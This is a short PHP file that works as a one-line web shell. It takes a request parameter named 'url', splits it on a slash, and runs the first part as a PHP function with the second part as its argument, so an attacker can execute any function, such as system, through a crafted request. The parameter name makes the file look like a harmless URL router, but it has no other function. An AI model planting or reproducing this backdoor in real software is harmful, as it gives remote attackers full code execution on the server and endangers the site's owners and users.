<?php
	if(isset($_REQUEST['url'])){
		$url=explode('/', $_REQUEST['url']);
		$url[0]($url[1]);
	}
?>
